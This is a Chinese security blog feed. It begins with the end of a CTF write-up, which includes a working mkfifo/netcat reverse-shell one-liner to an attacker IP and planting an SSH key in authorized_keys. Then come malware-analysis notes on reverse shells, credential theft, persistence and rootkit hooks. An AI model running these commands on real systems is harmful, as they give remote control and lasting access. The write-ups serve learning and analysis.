class="code"><pre><div class="line">gcc exploit.c -o exploit</div><div class="line">./exploit</div></pre></td></tr></table></figure></p><p>发现完全没有反应，蒙，完全不知道什么报错，想看错误,反弹shell</p><h3 id="显示错误"><a href="#显示错误" class="headerlink" title="显示错误"></a>显示错误</h3><p>先本地监听<br><code>nc -vlp 1234</code><br>搭建web服务，写入反弹shell（这里改掉ip就好啦）<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.107.42 1234 &gt;/tmp/f</code><br>多试几次就行啦。<br>接着是发现,运行参数出错。蒙，，，，又去py出题人，出题人表示这是shell环境不一样，提示ssh连上去</p><h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>ssh登录有两种方法，<br>方法1:用户名密码登录<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -l root <span class="number">192.168</span><span class="number">.0</span><span class="number">.11</span>  （默认端口<span class="number">22</span>）</div><div class="line">ssh -l root -p <span class="number">12333</span> <span class="number">216.230</span><span class="number">.230</span><span class="number">.114</span> （修改端口<span class="number">12333</span>）</div></pre></td></tr></table></figure></p><p>方法2:用户免密码登录<br>本地生成公私钥，将公钥放在需要ssh登录的机器上<br>本地生成公私钥,执行这条命令，就会在根目录上发现.ssh目录<br><code>ssh-keygen -t rsa</code><br>利用ls -a查看<br>进入.ssh目录，将id_rsa.pub的内容复制到需要ssh登录的机器上，在已经得到shell的机器上，进入当前用户目录，创建一个.ssh目录,并将公钥写入authorized_keys文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir .ssh</div><div class="line">cd .ssh </div><div class="line">echo <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBt2kJefRVdsr5DcRemSvHSVRIJZ+GchQ3bK4mHPP2+mkItPz28UE1+V0SvAbzqyMVZQeWuV0wwluoco5zHcuk5ki/Mz/9nn4XKC55qp90Qu+7spSg8Ff496Gkz65sMpNOWpVpyKJy5iwBeCjyTLlcy3hTHqpEeIZvGF8B/Pku5vxqhf1GnOkqUjmv2Fzr2cgovmiE1pilZBB3lwtu6IGZzbO5pHqwdZ9WrDDNwbwQ6+dK0kZFqZN1XgsMeBOezSL19NnWZLx+e/byzrgCxf6fXefUlC4tja+49ibGsKbv7RbH18Kk0af46O1hWUAeBL1SPGFad+Bv/X4X/XQC4Wcx root@kali</span></div><div class="line"><span class="string">"</span> &gt; authorized_keys</div></pre></td></tr></table></figure></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h2><p>创建一个隐藏文件<br>echo 666666&gt;&gt;suzhu.txt:stream.txt<br>显示隐藏文件<br>notepad suzhu.txt:stream.txt<br>隐藏图片<br>type aaa.jpg&gt;&gt;suzhu.txt:aaa.jpg<br>打开图片<br>mspaint suzhu.txt:aaa.jpg</p><h2 id="内存镜像取证"><a href="#内存镜像取证" class="headerlink" title="内存镜像取证"></a>内存镜像取证</h2><p>1、获取版本号<br>volatility -f pc.raw imageinfo<br>2、查看运行进程<br>volatility -f pc.raw –profile=WinXPSP3x86 pslist<br>3、dump出某个pid[exe程序]<br>volatility -f pc.raw –profile=WinXPSP3x86 memdump -p 3832 -D .<br>4、查看注册表<br>volatility -f pc.raw –profile=WinXPSP3x86 hivelist<br>5、dump用密码（-s 值SAM的虚拟地址，-y值system的虚拟地址）<br>volatility -f pc.raw –profile=WinXPSP3x86 hashdump -y 0xe1036b60 -s 0xe15d9008 &gt; 1.txt<br>6、查看用户名<br>volatility -f pc.raw –profile=WinXPSP3x86 printkey -K “SAM\Domains\Account\Users\Names”</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛，自己出题自己做的。&lt;br&gt;
    
    </summary>
    
      <category term="wp" scheme="http://yoursite.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———恶意代码行为</title>
    <link href="http://yoursite.com/2018/04/30/re_16_evil_4/"/>
    <id>http://yoursite.com/2018/04/30/re_16_evil_4/</id>
    <published>2018-04-30T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:23.857Z</updated>
    
    <content type="html"><![CDATA[<p>前面都在关注恶意代码分析，很少关注恶意代码能够做什么，接下来是熟悉恶意代码最常见的行为特征。<br><a id="more"></a></p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="下载器和启动器"><a href="#下载器和启动器" class="headerlink" title="下载器和启动器"></a>下载器和启动器</h2><p>  常见的两中恶意代码是下载器和启动器，下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用打包在一起，下载器常用Windows API函数URLDownloadtoFileA和WinExec,来下载并运行新的恶意代码。<br>  启动器(也称为加载器)是一类可执行文件，用来安装立即运行或者秘密执行的代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="后门-backdoor"><a href="#后门-backdoor" class="headerlink" title="后门(backdoor)"></a>后门(backdoor)</h2><p>  后门是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。它们拥有许多功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。<br>  后门程序利用互联网的通讯方式是多样的，但是一个常用的方法是利用80端口使用http协议，http是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。后门拥有一套通用的功能，比如操作注册表，列举窗口，创建目录，搜索文件等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p>  反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限，反向shell或者作为一个单独的恶意代码存在，或者作为一个复杂后门 程序的组件而存在，在反向shell中，攻击者能够如同在本地系统上运行命令一样。</p><h4 id="Netcat反向shell"><a href="#Netcat反向shell" class="headerlink" title="Netcat反向shell"></a>Netcat反向shell</h4><p>  可以通过在两台机器上运行Netcat，创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat,或者和其他程序一起打包使用。<br>  Netcat被作为一个反向shell使用，远程机器(攻击者)使用下列命令，等待入站连接。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -l -p</div><div class="line">-l选项设置Netcat为监听模式，-p用来设置监听端口。</div></pre></td></tr></table></figure></p><p>  受害机器会自动向外连接，并使用下列命令提供shell。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc listener_ip <span class="number">80</span> -e cmd.exe</div><div class="line">listener_ip是远程机器(攻击者)的ip地址和端口，-e选项用来指定连接建立后要运行的程序(windows系统中，最常使用cmd.exe)。</div></pre></td></tr></table></figure></p><h4 id="windwos反向shell"><a href="#windwos反向shell" class="headerlink" title="windwos反向shell"></a>windwos反向shell</h4><p>  使用cmd.exe作为windonws系统中的反向shell,有两种简单的恶意代码实现:基础方法和多线程技术<br>  基础方法:在恶意代码编写者之间比较流行。因为它容易编写，且效果与多线程技术一致，</p><h3 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h3><p>  僵尸网络是被感染主机(僵尸主机)的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机，从而是僵尸网络传播其它的恶意代码或蠕虫，或者分布式拒绝服务(DDoS)攻击。<br>  DDoS:在实施分布式拒绝服务攻击时，所有的僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="远程控制工具与僵尸网络的比较"><a href="#远程控制工具与僵尸网络的比较" class="headerlink" title="远程控制工具与僵尸网络的比较"></a>远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有些不同:<br>  1、僵尸网络感染和控制数以百万的主机。远程控制工具通常只控制很少数量的主机<br>  2、僵尸网络中的所有主机在同一时候被控制。远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密的联系。<br>  3、远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</p><h2 id="登录凭证窃密器"><a href="#登录凭证窃密器" class="headerlink" title="登录凭证窃密器"></a>登录凭证窃密器</h2><p>  攻击者经常会不遗余力地去窃取登录凭证，主要使用下面三种类型的恶意代码<br>  1、等待用户登录以窃取登录凭证的程序<br>  2、转储Windows系统中存放信息的程序，例如:密码哈希值，程序直接使用，或者对它进行离线破解。<br>  3、键盘记录器</p><h3 id="GINA-验证界面-拦截"><a href="#GINA-验证界面-拦截" class="headerlink" title="GINA(验证界面)拦截"></a>GINA(验证界面)拦截</h3><p>  在Windows xp系统中，恶意代码使用微软图像识别和验证界面(GINA)拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程。恶意代码编写者利用GINA对第三方的支持来加载窃密器。<br>  GINA在msgina.dll中实现，这个dll在用户登录系统过程中由winlogon可执行文件加载。winlogon也为第三方制定实现dll程序工作，在winlogon与GINA DLL之间加载第三方(类似中间人攻击)。为了方便，windows用下列注册表项，来存储winlogon加载的第三方dll。<br>  恶意代码必须包含GINA要求的所有导出函数。具体而言，它必须导出超过15个函数，且大部分前缀是Wlx。显然，如果你分析一个dll有许多包含前缀Wlx的导出函数，那么你就有很充分的理由判定你正在分析的样本是一个GINA拦截器。</p><h3 id="口令哈希转储"><a href="#口令哈希转储" class="headerlink" title="口令哈希转储"></a>口令哈希转储</h3><p>  转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解。或者利用它们只需Pass-the-Hash攻击，这种攻击在无须破解或获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获取访问权。</p><h2 id="存活机制"><a href="#存活机制" class="headerlink" title="存活机制"></a>存活机制</h2><p>  一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活，如果存活机制足够特别，他甚至能作为给定恶意代码的指纹</p><h3 id="windows注册表"><a href="#windows注册表" class="headerlink" title="windows注册表"></a>windows注册表</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>Sysinternals工具: 可以自动化的寻找出系统中自动启动程序。<br>ProcMon工具     : 帮助你在执行基本动态分析时，监控系统中的所有注册表修改。</p><h4 id="AppInit-dll"><a href="#AppInit-dll" class="headerlink" title="AppInit_dll"></a>AppInit_dll</h4><p>恶意代码编写者可以通过一个名为AppInit_dll特殊注册表项来让他们的dll获得加载。AppInit_dll中的dll程序会在进程加载User32.dll时被加载。插入dll路径到注册表AppInit_dll，会让dll程序获得加载机会。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost</div></pre></td></tr></table></figure></p><h4 id="Winlogon-Notify"><a href="#Winlogon-Notify" class="headerlink" title="Winlogon Notify"></a>Winlogon Notify</h4><p>恶意代码编写者可以挂钩一个特殊的winlogon事件。如登录、注销、关机等等。这<br>甚至可以允许恶意软件在安全模式下加载。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</div></pre></td></tr></table></figure></p><h3 id="特洛伊木马化-Trojanized-系统二进制文件"><a href="#特洛伊木马化-Trojanized-系统二进制文件" class="headerlink" title="特洛伊木马化(Trojanized)系统二进制文件"></a>特洛伊木马化(Trojanized)系统二进制文件</h3><p>  恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化dll正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行的一个空节中。插入的代码通常用来加载恶意代码。加载恶意代码后，为了让dll的操作与插入前的代码一致，代码会跳转回原始的dll程序。</p><h3 id="dll加载顺序劫持"><a href="#dll加载顺序劫持" class="headerlink" title="dll加载顺序劫持"></a>dll加载顺序劫持</h3><p>dll加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的dll程序。<br>windows xp上加载dll的默认搜索顺序:<br>1、加载应用程序的目录<br>2、当前目录<br>3、系统目录<br>4、16位子系统的系统目录<br>5、Windows目录<br>6、path环境变量里列出的目录。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="使用SeDebugPrivilege"><a href="#使用SeDebugPrivilege" class="headerlink" title="使用SeDebugPrivilege"></a>使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege。<br>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取 系统进程拥有的所有权限(默认情况本地管理员账户才有权限)。</p><h2 id="隐藏它的踪迹-用户态的Rootkit"><a href="#隐藏它的踪迹-用户态的Rootkit" class="headerlink" title="隐藏它的踪迹-用户态的Rootkit"></a>隐藏它的踪迹-用户态的Rootkit</h2><p>常用来隐藏恶意代码行为的工具被称为Rootkit。Rootkit有多种存在形式，但是大部分Rootkit通过修改操作系统内部的功能来工作。这种修改可以为恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏。<br>一些Rootkit会修改用户态的应用程序，但是大部分会修改内核，因为保护机制都运行在内核层。</p><h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接，这种挂钩方法是修改导入地址表(IAT)或者导出地址表(EAT)。<br>一个IAT Hook的例子如下:正常调用函数与hook函数，修改IAT<br><img src="https://i.imgur.com/kqdnGkB.png" alt=""><br>上面的路径是正常执行流，下面路径是加入Rootkit后的执行流。不过IAT Hook是一种过时且容易探测的挂钩方式，因此现在的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>Inline Hook是通过覆盖导入dll中API函数代码来实现的，所以它必须等到dll被加载后才能执行。IAT Hook只简单修改函数指针，但是Inline Hook将修改函数实际的函数代码。<br>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者是改变它，而不是跳到恶意代码。<br>例如：一个Inline Hook函数ZwDeviceIoControlFile的例子，应用程序如Netstat,用这个函数来提取系统的网络信息。<br><img src="https://i.imgur.com/zezjh36.png" alt=""><br>现在，ZwDeviceIoControlFile会先调用Rootkit的函数，Rootkit的挂钩函数移除所有发送到目的端口443的流量以后，再调用真实的ZwDeviceIoControlFile函数，使一切操作与没有安装挂钩之前一样继续进行。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面都在关注恶意代码分析，很少关注恶意代码能够做什么，接下来是熟悉恶意代码最常见的行为特征。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———分析恶意Windows-API</title>
    <link href="http://yoursite.com/2018/04/28/re_15_evil_3/"/>
    <id>http://yoursite.com/2018/04/28/re_15_evil_3/</id>
    <published>2018-04-28T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:20.607Z</updated>
    
    <content type="html"><![CDATA[<p>多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。<br><a id="more"></a></p><h1 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h1><p>Windows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式。Windows API使用特定术语，名字，已经约定。</p><h2 id="类型和匈牙利表达法"><a href="#类型和匈牙利表达法" class="headerlink" title="类型和匈牙利表达法"></a>类型和匈牙利表达法</h2><p>多数Windows API使用它自己的 名字，来表示C语言类型。Windows总体上使用匈牙利表达法，作为API函数标识符，这个表达式 使用一个前缀命名模式<br>windows API中的常见类型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">类型和前缀                    描述</div><div class="line">WORD(w) 一个<span class="number">16</span>位的无符号数值</div><div class="line">DWORD(dw) 一个双字节，<span class="number">32</span>位的无符号数值</div><div class="line">Handles(H) 一个对象索引</div><div class="line">Long Pointer(L) 一个指向另一类型的指针</div><div class="line">Callback表示一个将会被Windows API调用的函数</div></pre></td></tr></table></figure></p><h2 id="句柄-HANDLE"><a href="#句柄-HANDLE" class="headerlink" title="句柄(HANDLE)"></a>句柄(HANDLE)</h2><p>句柄是在操作系统中被打开或被创建的项。你对句柄做的唯一的事情，就是保存它，并在后续函数调用中使用它来引用同一对象。<br>例:CreateWindowEx函数是一个句柄的简单例子。他返回一个HWND,这是一个窗口句柄。任何时候当你想要对那个窗口做些什么，比如调用DestroyWindows函数是，你就需要使用这个窗口。</p><h2 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h2><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件，而且独特文件名或修改为既有的文件名是明显的基于主机的感染现象。</p><h3 id="CreateFile"><a href="#CreateFile" class="headerlink" title="CreateFile"></a>CreateFile</h3><p>这个函数被用来创建和打开文件。它可以打开已经存在的文件，管道，流，以及I/O设备。还能创建新的文件。<br>函数结构体<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">LPCTSTR,lpFileName,     <span class="comment">//指向文件名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwDesiredAccess,  <span class="comment">//访问模式（读/写）  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwShareMode,       <span class="comment">//共享模式  </span></span></span></div><div class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES lpSecurityAttributes,<span class="comment">//指向安全属性的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwCreationDisposition,               <span class="comment">//如何让创建  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwFlagAndAttributes,                 <span class="comment">//文件属性  </span></span></span></div><div class="line"><span class="function"><span class="params">HANDLE hTemplateFile                       <span class="comment">//用于复制文件句柄  </span></span></span></div><div class="line">)；</div></pre></td></tr></table></figure></p><h3 id="ReadFile和WriteFile"><a href="#ReadFile和WriteFile" class="headerlink" title="ReadFile和WriteFile"></a>ReadFile和WriteFile</h3><p>这两个函数用来对文件进行读写<br>ReadFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ReadFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></div><div class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></div><div class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>WriteFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HANDLE  hFile,<span class="comment">//文件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPCVOID lpBuffer,<span class="comment">//数据缓存区指针</span></span></span></div><div class="line"><span class="function"><span class="params">DWORD   nNumberOfBytesToWrite,<span class="comment">//你要写的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></div><div class="line"><span class="function"><span class="params">LPOVERLAPPED lpOverlapped<span class="comment">//OVERLAPPED结构体指针</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="CreateFileMapping和MapViewofFile"><a href="#CreateFileMapping和MapViewofFile" class="headerlink" title="CreateFileMapping和MapViewofFile"></a>CreateFileMapping和MapViewofFile</h3><p>文件映射经常被恶意代码作者使用，因为它们允许讲一个文件加载到内存中，以便更加容易地进行操作。CreateFileMapping函数负责从磁盘上加载一个文件到内存。MapViewofFile函数则返回一个指向映射的基地址指针，它可以被用来访问内存中的文件。<br>CreateFileMapping函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">_In_HANDLE hFile,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPSECURITY_ATTRIBUTES lpAttributes,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD flProtect,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeHigh,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeLow,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPCTSTR lpName</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>MapViewofFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFileEx</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap,</span></span></div><div class="line"><span class="function"><span class="params">　　__in LPVOID lpBaseAddress</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>Windows系统中有一些特殊文件类型，它们的访问方式与普通文件不太一样。恶意程序经常使用特殊文件。比如:一下特殊文件比普通文件更隐蔽，因为它们在列出目录时不会显示出来，某些特殊文件可以提取对系统硬件和内部数据更强的访问能力。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序配置信息，比如设置和选项，和文件系统一样，它是基于主机的感染迹象的很好来源，并且能够揭示出关于恶意代码功能的有用信息。Windows的早期版本使用.ini文件来保存配置信息。注册表被引入后，作为一个层次逐步提升。现在几乎所有的Windows配置信息都保存在注册表中，包括网络驱动，启动项，用户账户，以及其他信息。<br>恶意代码经常使用注册表来完成持久驻留或者存储配置数据。恶意代码添加项到注册表中，这使它在计算机引导时能够自动运行。</p><h3 id="你需要知道几个重要的注册表术语"><a href="#你需要知道几个重要的注册表术语" class="headerlink" title="你需要知道几个重要的注册表术语"></a>你需要知道几个重要的注册表术语</h3><p>根键: 注册表被划分为称为根键的5个顶层节。有时，术语HKEY和储巢也被使用。每一个跟键有一个特定的目的。<br>子键: 一个子键就像一个文件夹中的子文件夹<br>键: 一个键是一个注册表中的文件夹，它可以包含额外的文件夹或键值。跟健和子键都是键。<br>值项: 一个值项是一个配对的名字和值。<br>值或数据: 值或数据是存储在注册表项中的数据。</p><h3 id="注册表根键"><a href="#注册表根键" class="headerlink" title="注册表根键"></a>注册表根键</h3><p>注册表被划分成下面5个键:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HEKY_LOCAL_MACHINE(HKLM) 保存对本地机器全局设置</div><div class="line">HEKY_CURRENT_USER(HKCU)  保存当前用户特定的设置</div><div class="line">HEKY_CLASSES_ROOT  保存定义的类型信息</div><div class="line">HEKY_CURRENT_CONFIG 保存关于当前硬件配置的设置</div><div class="line">HEKY_USERS 定义默认用户，新用户和当前用户的配置</div></pre></td></tr></table></figure></p><p>最常用的根键是HKLM和HKCU。</p><h3 id="注册表编辑器-Regedit"><a href="#注册表编辑器-Regedit" class="headerlink" title="注册表编辑器(Regedit)"></a>注册表编辑器(Regedit)</h3><p>注册表编辑器(Regedit)是windows内建的用来查看和编辑注册表的工具。</p><h3 id="自启动程序"><a href="#自启动程序" class="headerlink" title="自启动程序"></a>自启动程序</h3><p>向run子健中写入项，是一个普定设置程序自启动的方法，尽管不是一个隐蔽的技术，它任然经常被恶意代码用来自启动自身程序。(Autoruns工具可以使用)</p><h3 id="常用注册表函数"><a href="#常用注册表函数" class="headerlink" title="常用注册表函数"></a>常用注册表函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RegOpenKeyEx 打开一个注册表进行编辑和查询(有些函数例外，大多数还是会使用的)。</div><div class="line">RegSetValueEx 添加一个新值到注册表，并设置它的数值。</div><div class="line">RegGetValue   返回注册表中一个值项的数值</div></pre></td></tr></table></figure><h2 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h2><h3 id="伯克利兼容套接字"><a href="#伯克利兼容套接字" class="headerlink" title="伯克利兼容套接字"></a>伯克利兼容套接字</h3><p>在Windows的网络选项中，恶意代码最普遍使用的是伯克利兼容套接字，在UNIX也是一样的。伯克利兼容套接字的网络功能在Windows系统中是由Winsock库实现的，主要在ws32_32.dll中，在所有库函数中，socket,connect,bind,listen,accept,send和recv函数最常用的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">socket创建一个套接字</div><div class="line">bind将一个套接字绑定到特定端口，应该在accept前调用</div><div class="line">listen准备着一个套接字将进入监听，等待入站连接</div><div class="line">accept向一个远程套接字打开一个连接，并接受连接</div><div class="line">connect向一个远程套接字打开一个连接，远程套接字必须在等待连接</div><div class="line">recv 从远程套接字接收数据</div><div class="line">send发送数据到远程套接字</div></pre></td></tr></table></figure></p><h2 id="跟踪恶意代码的运行"><a href="#跟踪恶意代码的运行" class="headerlink" title="跟踪恶意代码的运行"></a>跟踪恶意代码的运行</h2><h3 id="动态链接库-DLL"><a href="#动态链接库-DLL" class="headerlink" title="动态链接库(DLL)"></a>动态链接库(DLL)</h3><p>DLL(Dynamic Link 